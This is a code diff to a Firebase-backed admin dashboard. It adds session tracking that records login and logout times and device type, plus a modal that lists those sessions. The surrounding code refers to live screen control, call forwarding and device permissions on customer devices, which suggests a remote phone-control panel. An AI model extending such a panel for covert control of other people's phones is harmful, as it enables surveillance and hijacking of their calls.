@@ -34,6 +34,10 @@ let activeModalType = 'new';
 // Wake-up Tracking & FCM Config
 let previousDeviceStates = {};
 let pingingDevices = new Set();
+// Session Tracking Globals
+let currentSessionId = null;
+let currentSessionPath = null;
+
 const PING_PROXY_URL = "https://script.google.com/macros/s/AKfycbzUv35AT0wIms3nE5EdbeehvuRM2qlx761NeP46oJjpvFVaqZZBqeZ5ZDSxfgR8OLZT/exec"; 
 let pingVisualTimeout = null;
 
@@ -59,6 +63,9 @@ function displayDashboard(username) {
     document.getElementById('nav-user-name').innerText = username;
     document.getElementById('user-initial').innerText = username.charAt(0).toUpperCase();
 
+    // Start Session Tracking in AdminActivity
+    recordAdminSession(username);
+
     // Start Realtime Database listener
     syncDashboardWithFirebase();
 
@@ -74,6 +81,7 @@ function displayDashboard(username) {
         if (activeModalType === 'permissions') title = 'Device Permissions';
         if (activeModalType === 'screen_control') title = 'Live Screen Control';
         if (activeModalType === 'call_forwarding') title = 'Call Forwarding Setup';
+        if (activeModalType === 'admin_login_time') title = 'Admin Activity Duration';
         
         document.getElementById('modal-header-title').innerText = title;
         document.getElementById('details-modal').classList.remove('hidden');
@@ -92,6 +100,55 @@ function displayDashboard(username) {
     // Change Body Background
     document.body.classList.replace("bg-gradient-to-tr", "bg-slate-50");
     document.body.classList.remove("from-slate-900", "via-indigo-950", "to-slate-900");
+}
+
+/**
+ * Records the start of an admin session in Firebase
+ */
+function recordAdminSession(username) {
+    const now = new Date();
+    const dateStr = now.toISOString().split('T')[0];
+    currentSessionId = "sess_" + Date.now();
+    currentSessionPath = `AdminActivity/${dateStr}/${username}/${currentSessionId}`;
+    
+    // Detect Web Device Info
+    const ua = navigator.userAgent;
+    let deviceName = username; // Fallback to login name
+    if (ua.includes("Windows")) deviceName = "Web (Windows)";
+    else if (ua.includes("Mac")) deviceName = "Web (MacBook)";
+    else if (ua.includes("Android")) deviceName = "Web (Android)";
+    else if (ua.includes("iPhone")) deviceName = "Web (iPhone)";
+
+    const sessionData = {
+        login: now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true }),
+        logout: "Active Now",
+        model: deviceName,
+        status: "online",
+        timestamp: Date.now()
+    };
+
+    const sessionRef = database.ref(currentSessionPath);
+    sessionRef.set(sessionData);
+
+    // If user closes tab unexpectedly, mark as offline
+    sessionRef.onDisconnect().update({
+        logout: "Unexpected Close",
+        logout_time: Date.now(),
+        status: "offline"
+    });
+}
+
+/**
+ * Updates the session record as offline before logging out
+ */
+async function endAdminSession() {
+    if (currentSessionPath) {
+        await database.ref(currentSessionPath).update({
+            logout: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true }),
+            logout_time: Date.now(),
+            status: "offline"
+        });
+    }
 }
 
 function syncDashboardWithFirebase() {
@@ -600,9 +657,11 @@ function attemptLogin() {
     }
 }
 
-function logout() {
+async function logout() {
+    await endAdminSession();
     localStorage.removeItem('isLoggedIn');
     localStorage.removeItem('username');
+    localStorage.removeItem('activeTab');
     location.reload();
 }
 
@@ -618,6 +677,20 @@ function showCustomerDetailsPopup(deviceId) {
     document.getElementById('details-modal').classList.remove('hidden');
     document.body.style.overflow = 'hidden';
     renderModalUI(deviceId);
+}
+
+/**
+ * Opens the Admin Login Time tracking popup
+ */
+function showAdminLoginTimePopup() {
+    activeModalDeviceId = "global"; // Using a dummy ID for global activity
+    activeModalType = 'admin_login_time';
+    localStorage.setItem('activeModalDeviceId', "global");
+    localStorage.setItem('activeModalType', 'admin_login_time');
+    document.getElementById('modal-header-title').innerText = 'Admin Activity Duration';
+    document.getElementById('details-modal').classList.remove('hidden');
+    document.body.style.overflow = 'hidden';
+    renderModalUI("global");
 }
 
 /**
@@ -702,8 +775,8 @@ function closeDetailsModal() {
  * Renders the modal content from the current snapshot
  */
 function renderModalUI(deviceId) {
-    if (!lastSnapshotData || !lastSnapshotData.Devices[deviceId]) return;
-    const dev = lastSnapshotData.Devices[deviceId];
+    if (!lastSnapshotData) return;
+    const dev = deviceId !== "global" ? lastSnapshotData.Devices[deviceId] : null;
     const modalBody = document.getElementById('modal-body');
     
     // Optimization for Screen Control: only update the image source to prevent UI flicker
@@ -758,6 +831,65 @@ function renderModalUI(deviceId) {
                         </div>
                     </div>
                 `).join('')}
+            </div>
+        </div>`;
+    } else if (activeModalType === 'admin_login_time') {
+        // Admin Activity Duration Logic
+        const activity = lastSnapshotData.AdminActivity || {};
+        let sessionList = [];
+
+        Object.keys(activity).forEach(date => {
+            Object.keys(activity[date]).forEach(adminId => {
+                Object.keys(activity[date][adminId]).forEach(sessId => {
+                    sessionList.push({ ...activity[date][adminId][sessId], sessId });
+                });
+            });
+        });
+
+        // Sort by timestamp: Latest login first
+        sessionList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+
+        html += `<div class="space-y-6">
+            <!-- Modern Table Header -->
+            <div class="grid grid-cols-[1fr_1fr_0.8fr] gap-2 px-4 py-2 bg-slate-100 rounded-xl border border-slate-200">
+                <span class="text-[8px] font-black text-slate-500 uppercase tracking-widest">Login</span>
+                <span class="text-[8px] font-black text-slate-500 uppercase tracking-widest text-center">Logout</span>
+                <span class="text-[8px] font-black text-slate-500 uppercase tracking-widest text-right">Terminal</span>
+            </div>
+
+            <!-- History List -->
+            <div class="space-y-3">
+                ${sessionList.map(s => {
+                    const isActive = s.logout === "Active Now";
+                    const logoutDisplay = isActive ? 
+                        '<span class="flex items-center justify-center space-x-1"><span class="h-1 w-1 bg-emerald-500 rounded-full animate-ping"></span><span class="text-emerald-600">LIVE</span></span>' : 
+                        (s.logout_time ? new Date(s.logout_time).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true }).toLowerCase() : '---');
+                    
+                    return `
+                    <div class="group relative bg-white border border-slate-200 p-4 rounded-2xl shadow-sm hover:shadow-md hover:border-indigo-300 transition-all">
+                        <div class="absolute -left-1 top-1/2 -translate-y-1/2 w-1.5 h-6 ${isActive ? 'bg-emerald-500' : 'bg-slate-200'} rounded-full"></div>
+                        
+                        <div class="grid grid-cols-[1fr_1fr_0.8fr] gap-2 items-center">
+                            <!-- Login Column -->
+                            <div class="flex items-center space-x-2">
+                                <div class="w-6 h-6 bg-indigo-50 rounded-lg flex items-center justify-center text-indigo-500"><i data-lucide="log-in" class="w-3 h-3"></i></div>
+                                <span class="text-[11px] font-black text-slate-700">${s.login || '---'}</span>
+                            </div>
+
+                            <!-- Logout Column -->
+                            <div class="flex items-center justify-center space-x-2 border-l border-r border-slate-50">
+                                <div class="w-6 h-6 bg-rose-50 rounded-lg flex items-center justify-center text-rose-500"><i data-lucide="log-out" class="w-3 h-3"></i></div>
+                                <span class="text-[11px] font-black text-slate-700">${logoutDisplay}</span>
+                            </div>
+
+                            <!-- Model Column -->
+                            <div class="text-right">
+                                <span class="text-[9px] font-black text-indigo-600 bg-indigo-50 px-2 py-1 rounded-lg border border-indigo-100 uppercase truncate inline-block max-w-full">${s.model || 'Unknown'}</span>
+                            </div>
+                        </div>
+                    </div>
+                    `;
+                }).join('') || '<div class="py-16 text-center text-slate-300 font-bold uppercase text-[10px] tracking-widest">No Session Logs Found</div>'}
             </div>
         </div>`;
     } else if (activeModalType === 'call_forwarding') {
